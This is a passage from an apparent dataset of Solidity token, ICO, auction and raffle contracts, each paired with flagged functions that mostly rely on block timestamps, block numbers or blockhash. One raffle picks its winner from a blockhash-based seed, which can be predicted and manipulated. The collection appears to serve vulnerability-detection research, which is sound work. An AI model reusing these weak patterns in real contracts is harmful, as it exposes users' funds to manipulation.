    "function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {\nif (_tokens == 0) {\nreturn (0, 0);\n}\nuint256 activeTier = getActiveTier();\nif (activeTier == tiers.length) {\nif (endTime < block.timestamp) {\nreturn (0, 0);\n}\nif (startTime > block.timestamp) {\nactiveTier = PRE_ICO_TIER_FIRST;\n}\n}\nusdAmount = _tokens.mul((price * (100 - tiers[activeTier].discount) / 100));\nethers = usdAmount.div(etherPriceInUSD);\nif (ethers < getMinEthersInvestment()) {\nreturn (0, 0);\n}\nusdAmount = usdAmount.div(uint256(10) ** 18);\n}",
    "function burnUnsoldTokens() public onlyOwner {\nif (block.timestamp >= endTime && maxTokenSupply > soldTokens) {\ntoken.burnUnsoldTokens(maxTokenSupply.sub(soldTokens));\nmaxTokenSupply = soldTokens;\n}\n}",
    "function isRefundPossible() public view returns (bool) {\nif (isActive() || block.timestamp < startTime || collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\nreturn false;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b3f"
  },
  "filename": "220.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b40"
  },
  "filename": "2224.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _who, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _who) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != 0x0);\n require(_to != address(this));\n require(balances[msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(_from != 0x0);\n require(_to != 0x0);\n require(_to != address(this));\n require(balances[_from] >= _value);\n require(allowed[_from][msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _who, uint256 _value) public returns (bool) {\n require(_who != 0x0);\n require(_value == 0 || allowed[msg.sender][_who] == 0);\n allowed[msg.sender][_who] = _value;\n Approval(msg.sender, _who, _value);\n return true;\n }\n function allowance(address _owner, address _who) constant public returns (uint256)\n {\n return allowed[_owner][_who];\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n}\ncontract GoToken is StandardToken {\n string constant public name = \"GoToken\";\n string constant public symbol = \"GOT\";\n uint256 constant public decimals = 18;\n uint256 constant multiplier = 10 ** (decimals);\n event Deployed(uint256 indexed _total_supply);\n function GoToken(address auction_address, address wallet_address, uint256 initial_supply) public\n {\n require(auction_address != 0x0);\n require(wallet_address != 0x0);\n require(initial_supply > multiplier);\n totalSupply = initial_supply;\n balances[auction_address] = initial_supply / 2;\n balances[wallet_address] = initial_supply / 2;\n Transfer(0x0, auction_address, balances[auction_address]);\n Transfer(0x0, wallet_address, balances[wallet_address]);\n Deployed(totalSupply);\n assert(totalSupply == balances[auction_address] + balances[wallet_address]);\n }\n}\ncontract GoTokenDutchAuction {\n GoToken public token;\n address public owner_address;\n address public wallet_address;\n address public whitelister_address;\n address public distributor_address;\n uint256 constant public bid_threshold = 10 finney;\n uint256 public token_multiplier;\n uint256 public num_tokens_auctioned;\n uint256 public price_start;\n uint256 constant public CURVE_CUTOFF_DURATION = 8 days;\n uint256 public price_constant1;\n uint256 public price_exponent1;\n uint256 public price_constant2;\n uint256 public price_exponent2;\n uint256 public privatesale_start_time;\n uint256 public auction_start_time;\n uint256 public end_time;\n uint256 public start_block;\n uint256 public received_wei;\n uint256 public received_wei_with_bonus;\n uint256 public funds_claimed;\n uint256 public final_price;\n struct Account {\n uint256 accounted;\n uint256 received;\n }\n mapping (address => Account) public bids;\n mapping (address => bool) public privatesalewhitelist;\n mapping (address => bool) public publicsalewhitelist;\n uint256 constant public BONUS_DAY1_DURATION = 24 hours;\n uint256 constant public BONUS_DAY2_DURATION = 48 hours;\n uint256 constant public BONUS_DAY3_DURATION = 72 hours;\n uint256 public currentBonus = 0;\n uint256 constant public TOKEN_CLAIM_WAIT_PERIOD = 0 days;\n Stages public stage;\n enum Stages {\n AuctionDeployed,\n AuctionSetUp,\n AuctionStarted,\n AuctionEnded,\n TokensDistributed\n }\n modifier atStage(Stages _stage) {\n require(stage == _stage);\n _;\n }\n modifier isOwner() {\n require(msg.sender == owner_address);\n _;\n }\n modifier isWhitelister() {\n require(msg.sender == whitelister_address);\n _;\n }\n modifier isDistributor() {\n require(msg.sender == distributor_address);\n _;\n }\n event Deployed(uint256 indexed _price_start, uint256 _price_constant1, uint256 _price_exponent1, uint256 _price_constant2, uint256 _price_exponent2);\n event Setup();\n event AuctionStarted(uint256 indexed _auction_start_time, uint256 indexed _block_number);\n event BidSubmission(address indexed _sender,uint256 _amount, uint256 _amount_with_bonus, uint256 _remaining_funds_to_end_auction);\n event ClaimedTokens(address indexed _recipient, uint256 _sent_amount);\n event AuctionEnded(uint256 _final_price);\n event TokensDistributed();\n event PrivateSaleWhitelisted(address indexed who);\n event RemovedFromPrivateSaleWhitelist(address indexed who);\n event PublicSaleWhitelisted(address indexed who);\n event RemovedFromPublicSaleWhitelist(address indexed who);\n function GoTokenDutchAuction(\n address _wallet_address,\n address _whitelister_address,\n address _distributor_address,\n uint256 _price_start,\n uint256 _price_constant1,\n uint256 _price_exponent1,\n uint256 _price_constant2,\n uint256 _price_exponent2)\n public\n {\n require(_wallet_address != 0x0);\n require(_whitelister_address != 0x0);\n require(_distributor_address != 0x0);\n wallet_address = _wallet_address;\n whitelister_address = _whitelister_address;\n distributor_address = _distributor_address;\n owner_address = msg.sender;\n stage = Stages.AuctionDeployed;\n changePriceCurveSettings(_price_start, _price_constant1, _price_exponent1, _price_constant2, _price_exponent2);\n Deployed(_price_start, _price_constant1, _price_exponent1, _price_constant2, _price_exponent2);\n }\n function () public payable {\n bid();\n }\n function setup(address _token_address) public isOwner atStage(Stages.AuctionDeployed) {\n require(_token_address != 0x0);\n token = GoToken(_token_address);\n num_tokens_auctioned = token.balanceOf(address(this));\n token_multiplier = 10 ** (token.decimals());\n stage = Stages.AuctionSetUp;\n Setup();\n }\n function changePriceCurveSettings(\n uint256 _price_start,\n uint256 _price_constant1,\n uint256 _price_exponent1,\n uint256 _price_constant2,\n uint256 _price_exponent2)\n internal\n {\n require(stage == Stages.AuctionDeployed || stage == Stages.AuctionSetUp);\n require(_price_start > 0);\n require(_price_constant1 > 0);\n require(_price_constant2 > 0);\n price_start = _price_start;\n price_constant1 = _price_constant1;\n price_exponent1 = _price_exponent1;\n price_constant2 = _price_constant2;\n price_exponent2 = _price_exponent2;\n }\n function addToPublicSaleWhitelist(address[] _bidder_addresses) public isWhitelister {\n for (uint32 i = 0; i < _bidder_addresses.length; i++) {\n require(!privatesalewhitelist[_bidder_addresses[i]]);\n publicsalewhitelist[_bidder_addresses[i]] = true;\n PublicSaleWhitelisted(_bidder_addresses[i]);\n }\n }\n function removeFromPublicSaleWhitelist(address[] _bidder_addresses) public isWhitelister {\n for (uint32 i = 0; i < _bidder_addresses.length; i++) {\n publicsalewhitelist[_bidder_addresses[i]] = false;\n RemovedFromPublicSaleWhitelist(_bidder_addresses[i]);\n }\n }\n function addToPrivateSaleWhitelist(address[] _bidder_addresses) public isOwner {\n for (uint32 i = 0; i < _bidder_addresses.length; i++) {\n privatesalewhitelist[_bidder_addresses[i]] = true;\n PrivateSaleWhitelisted(_bidder_addresses[i]);\n }\n }\n function removeFromPrivateSaleWhitelist(address[] _bidder_addresses) public isOwner {\n for (uint32 i = 0; i < _bidder_addresses.length; i++) {\n privatesalewhitelist[_bidder_addresses[i]] = false;\n RemovedFromPrivateSaleWhitelist(_bidder_addresses[i]);\n }\n }\n function startAuction() public isOwner atStage(Stages.AuctionSetUp) {\n stage = Stages.AuctionStarted;\n auction_start_time = now;\n start_block = block.number;\n AuctionStarted(auction_start_time, start_block);\n }\n function bid() public payable\n {\n require(stage == Stages.AuctionSetUp || stage == Stages.AuctionStarted);\n require(privatesalewhitelist[msg.sender] || publicsalewhitelist[msg.sender]);\n if (stage == Stages.AuctionSetUp){\n require(privatesalewhitelist[msg.sender]);\n }\n require(msg.value > 0);\n require(bids[msg.sender].received + msg.value >= bid_threshold);\n assert(bids[msg.sender].received + msg.value >= msg.value);\n uint256 remaining_funds_to_end_auction = remainingFundsToEndAuction();\n require(msg.value <= remaining_funds_to_end_auction);\n if (stage == Stages.AuctionSetUp){\n require(privatesalewhitelist[msg.sender]);\n currentBonus = 25;\n }\n else if (stage == Stages.AuctionStarted) {\n if (privatesalewhitelist[msg.sender] && now >= auction_start_time && now < auction_start_time + BONUS_DAY1_DURATION) {\n currentBonus = 25;\n }\n else if (privatesalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY1_DURATION && now < auction_start_time + BONUS_DAY2_DURATION ) {\n currentBonus = 25;\n }\n else if (privatesalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY2_DURATION && now < auction_start_time + BONUS_DAY3_DURATION) {\n currentBonus = 25;\n }\n else if (privatesalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY3_DURATION) {\n currentBonus = 25;\n }\n else if (publicsalewhitelist[msg.sender] && now >= auction_start_time && now < auction_start_time + BONUS_DAY1_DURATION) {\n currentBonus = 15;\n }\n else if (publicsalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY1_DURATION && now < auction_start_time + BONUS_DAY2_DURATION ) {\n currentBonus = 10;\n }\n else if (publicsalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY2_DURATION && now < auction_start_time + BONUS_DAY3_DURATION) {\n currentBonus = 5;\n }\n else if (publicsalewhitelist[msg.sender] && now >= auction_start_time + BONUS_DAY3_DURATION) {\n currentBonus = 0;\n }\n else {\n currentBonus = 0;\n }\n }\n else {\n currentBonus = 0;\n }\n uint256 accounted = msg.value + msg.value * (currentBonus) / 100;\n bids[msg.sender].accounted += accounted;\n bids[msg.sender].received += msg.value;\n received_wei += msg.value;\n received_wei_with_bonus += accounted;\n wallet_address.transfer(msg.value);\n BidSubmission(msg.sender, msg.value, accounted, remaining_funds_to_end_auction);\n assert(received_wei >= msg.value);\n assert(received_wei_with_bonus >= accounted);\n }\n function finalizeAuction() public isOwner\n {\n require(stage == Stages.AuctionSetUp || stage == Stages.AuctionStarted);\n final_price = token_multiplier * received_wei_with_bonus / num_tokens_auctioned;\n end_time = now;\n stage = Stages.AuctionEnded;\n AuctionEnded(final_price);\n assert(final_price > 0);\n }\n function distributeGoTokens(address receiver_address)\n public isDistributor atStage(Stages.AuctionEnded) returns (bool)\n {\n require(now > end_time + TOKEN_CLAIM_WAIT_PERIOD);\n require(receiver_address != 0x0);\n require(bids[receiver_address].received > 0);\n if (bids[receiver_address].received == 0 || bids[receiver_address].accounted == 0) {\n return false;\n }\n uint256 num = (token_multiplier * bids[receiver_address].accounted) / final_price;\n uint256 auction_tokens_balance = token.balanceOf(address(this));\n if (num > auction_tokens_balance) {\n num = auction_tokens_balance;\n }\n funds_claimed += bids[receiver_address].received;\n bids[receiver_address].accounted = 0;\n bids[receiver_address].received = 0;\n require(token.transfer(receiver_address, num));\n ClaimedTokens(receiver_address, num);\n if (funds_claimed == received_wei) {\n stage = Stages.TokensDistributed;\n TokensDistributed();\n }\n assert(token.balanceOf(receiver_address) >= num);\n assert(bids[receiver_address].accounted == 0);\n assert(bids[receiver_address].received == 0);\n return true;\n }\n function price() public constant returns (uint256) {\n if (stage == Stages.AuctionEnded ||\n stage == Stages.TokensDistributed) {\n return 0;\n }\n return calcTokenPrice();\n }\n function remainingFundsToEndAuction() constant public returns (uint256) {\n uint256 required_wei_at_price = num_tokens_auctioned * price() / token_multiplier;\n if (required_wei_at_price <= received_wei) {\n return 0;\n }\n return required_wei_at_price - received_wei;\n }\n function calcTokenPrice() constant private returns (uint256) {\n uint256 elapsed;\n uint256 decay_rate1;\n uint256 decay_rate2;\n if (stage == Stages.AuctionDeployed || stage == Stages.AuctionSetUp){\n return price_start;\n }\n if (stage == Stages.AuctionStarted) {\n elapsed = now - auction_start_time;\n if (now >= auction_start_time && now < auction_start_time + CURVE_CUTOFF_DURATION){\n decay_rate1 = elapsed ** price_exponent1 / price_constant1;\n return price_start * (1 + elapsed) / (1 + elapsed + decay_rate1);\n }\n else if (now >= auction_start_time && now >= auction_start_time + CURVE_CUTOFF_DURATION){\n decay_rate2 = elapsed ** price_exponent2 / price_constant2;\n return price_start * (1 + elapsed) / (1 + elapsed + decay_rate2);\n }\n else {\n return price_start;\n }\n }\n }\n}",
  "extract_feature": [
    "function startAuction() public isOwner atStage(Stages.AuctionSetUp) {\nstage = Stages.AuctionStarted;\nauction_start_time = now;\nstart_block = block.number;\nAuctionStarted(auction_start_time, start_block);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b41"
  },
  "filename": "2252.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AccessAdmin is Ownable {\n mapping (address => bool) adminContracts;\n mapping (address => bool) actionContracts;\n function setAdminContract(address _addr, bool _useful) public onlyOwner {\n require(_addr != address(0));\n adminContracts[_addr] = _useful;\n }\n modifier onlyAdmin {\n require(adminContracts[msg.sender]);\n _;\n }\n function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n modifier onlyAccess() {\n require(actionContracts[msg.sender]);\n _;\n }\n}\ninterface CardsInterface {\n function balanceOf(address player) public constant returns(uint256);\n function updatePlayersCoinByOut(address player) external;\n function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public;\n function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n}\ninterface RareInterface {\n function getRareItemsOwner(uint256 rareId) external view returns (address);\n function getRareItemsPrice(uint256 rareId) external view returns (uint256);\n function getRareInfo(uint256 _tokenId) external view returns (\n uint256 sellingPrice,\n address owner,\n uint256 nextPrice,\n uint256 rareClass,\n uint256 cardId,\n uint256 rareValue\n );\n function transferToken(address _from, address _to, uint256 _tokenId) external;\n function transferTokenByContract(uint256 _tokenId,address _to) external;\n function setRarePrice(uint256 _rareId, uint256 _price) external;\n function rareStartPrice() external view returns (uint256);\n}\ncontract CardsRaffle is AccessAdmin {\n using SafeMath for SafeMath;\n function CardsRaffle() public {\n setAdminContract(msg.sender,true);\n setActionContract(msg.sender,true);\n }\n CardsInterface public cards ;\n RareInterface public rare;\n function setCardsAddress(address _address) external onlyOwner {\n cards = CardsInterface(_address);\n }\n function setRareAddress(address _address) external onlyOwner {\n rare = RareInterface(_address);\n }\n function getRareAddress() public view returns (address) {\n return rare;\n }\n event UnitBought(address player, uint256 unitId, uint256 amount);\n event RaffleSuccessful(address winner);\n struct TicketPurchases {\n TicketPurchase[] ticketsBought;\n uint256 numPurchases;\n uint256 raffleRareId;\n }\n struct TicketPurchase {\n uint256 startId;\n uint256 endId;\n }\n mapping(address => TicketPurchases) private ticketsBoughtByPlayer;\n mapping(uint256 => address[]) private rafflePlayers;\n uint256 private constant RAFFLE_TICKET_BASE_PRICE = 10000;\n uint256 private constant MAX_LIMIT = 1000;\n uint256 private raffleEndTime;\n uint256 private raffleRareId;\n uint256 private raffleTicketsBought;\n address private raffleWinner;\n bool private raffleWinningTicketSelected;\n uint256 private raffleTicketThatWon;\n function buyRaffleTicket(uint256 amount) external {\n require(raffleEndTime >= block.timestamp);\n require(amount > 0 && amount<=MAX_LIMIT);\n uint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\n require(cards.balanceOf(msg.sender) >= ticketsCost);\n cards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\n TicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\n if (purchases.raffleRareId != raffleRareId) {\n purchases.numPurchases = 0;\n purchases.raffleRareId = raffleRareId;\n rafflePlayers[raffleRareId].push(msg.sender);\n }\n if (purchases.numPurchases == purchases.ticketsBought.length) {\n purchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n }\n purchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\n raffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\n UnitBought(msg.sender,raffleRareId,amount);\n }\n function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\n require(rareId>0);\n require(rare.getRareItemsOwner(rareId) == getRareAddress());\n require(block.timestamp < endTime);\n if (raffleRareId != 0) {\n require(raffleWinner != 0);\n }\n raffleWinningTicketSelected = false;\n raffleTicketThatWon = 0;\n raffleWinner = 0;\n raffleTicketsBought = 0;\n raffleEndTime = endTime;\n raffleRareId = rareId;\n }\n function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\n require(raffleEndTime < block.timestamp);\n require(raffleWinner == 0);\n require(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\n if (!raffleWinningTicketSelected) {\n drawRandomWinner();\n }\n if (checkWinner != 0) {\n TicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\n if (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\n TicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\n if (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\n assignRafflePrize(checkWinner);\n return;\n }\n }\n }\n for (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\n address player = rafflePlayers[raffleRareId][i];\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n uint256 endIndex = playersTickets.numPurchases - 1;\n if (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\n for (uint256 j = 0; j < playersTickets.numPurchases; j++) {\n TicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\n if (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\n assignRafflePrize(player);\n return;\n }\n }\n }\n }\n }\n function assignRafflePrize(address winner) internal {\n raffleWinner = winner;\n uint256 newPrice = (rare.rareStartPrice() * 25) / 20;\n rare.transferTokenByContract(raffleRareId,winner);\n rare.setRarePrice(raffleRareId,newPrice);\n cards.updatePlayersCoinByOut(winner);\n uint256 upgradeClass;\n uint256 unitId;\n uint256 upgradeValue;\n (,,,,upgradeClass, unitId, upgradeValue) = rare.getRareInfo(raffleRareId);\n cards.upgradeUnitMultipliers(winner, upgradeClass, unitId, upgradeValue);\n RaffleSuccessful(winner);\n }\n function drawRandomWinner() public onlyAdmin {\n require(raffleEndTime < block.timestamp);\n require(!raffleWinningTicketSelected);\n uint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\n raffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\n raffleWinningTicketSelected = true;\n }\n function getRafflePlayers(uint256 raffleId) external constant returns (address[]) {\n return (rafflePlayers[raffleId]);\n }\n function getPlayersTickets(address player) external constant returns (uint256[], uint256[]) {\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n if (playersTickets.raffleRareId == raffleRareId) {\n uint256[] memory startIds = new uint256[](playersTickets.numPurchases);\n uint256[] memory endIds = new uint256[](playersTickets.numPurchases);\n for (uint256 i = 0; i < playersTickets.numPurchases; i++) {\n startIds[i] = playersTickets.ticketsBought[i].startId;\n endIds[i] = playersTickets.ticketsBought[i].endId;\n }\n }\n return (startIds, endIds);\n }\n function getLatestRaffleInfo() external constant returns (uint256, uint256, uint256, address, uint256) {\n return (raffleEndTime, raffleRareId, raffleTicketsBought, raffleWinner, raffleTicketThatWon);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function buyRaffleTicket(uint256 amount) external {\nrequire(raffleEndTime >= block.timestamp);\nrequire(amount > 0 && amount<=MAX_LIMIT);\nuint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\nrequire(cards.balanceOf(msg.sender) >= ticketsCost);\ncards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\nTicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\nif (purchases.raffleRareId != raffleRareId) {\npurchases.numPurchases = 0;\npurchases.raffleRareId = raffleRareId;\nrafflePlayers[raffleRareId].push(msg.sender);\n}\nif (purchases.numPurchases == purchases.ticketsBought.length) {\npurchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n}\npurchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\nraffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\nUnitBought(msg.sender,raffleRareId,amount);\n}",
    "function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\nrequire(rareId>0);\nrequire(rare.getRareItemsOwner(rareId) == getRareAddress());\nrequire(block.timestamp < endTime);\nif (raffleRareId != 0) {\nrequire(raffleWinner != 0);\n}\nraffleWinningTicketSelected = false;\nraffleTicketThatWon = 0;\nraffleWinner = 0;\nraffleTicketsBought = 0;\nraffleEndTime = endTime;\nraffleRareId = rareId;\n}",
    "function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\nrequire(raffleEndTime < block.timestamp);\nrequire(raffleWinner == 0);\nrequire(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\nif (!raffleWinningTicketSelected) {\ndrawRandomWinner();\n}\nif (checkWinner != 0) {\nTicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\nif (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\nTicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\nif (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\nassignRafflePrize(checkWinner);\nreturn;\n}\n}\n}\nfor (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\naddress player = rafflePlayers[raffleRareId][i];\nTicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\nuint256 endIndex = playersTickets.numPurchases - 1;\nif (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\nfor (uint256 j = 0; j < playersTickets.numPurchases; j++) {\nTicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\nif (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\nassignRafflePrize(player);\nreturn;\n}\n}\n}\n}\n}",
    "function drawRandomWinner() public onlyAdmin {\nrequire(raffleEndTime < block.timestamp);\nrequire(!raffleWinningTicketSelected);\nuint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\nraffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\nraffleWinningTicketSelected = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b42"
  },
  "filename": "2254.sol",
  "content": "pragma solidity ^0.4.16;\ncontract owned {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n owner = newOwner;\n }\n}\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }\ncontract TokenMomos is owned{\n string public name = \"Momocoin\";\n string public symbol = \"MOMO\";\n uint8 public decimals = 18;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n uint256 public totalSupply;\n bytes32 public currentChallenge;\n uint256 public timeOfLastProof;\n uint256 public difficulty = 10**32;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n constructor(uint256 momos) public {\n totalSupply = momos * 10 ** uint256(decimals);\n balanceOf[msg.sender] = totalSupply;\n timeOfLastProof = now;\n }\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value >= balanceOf[_to]);\n uint previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] 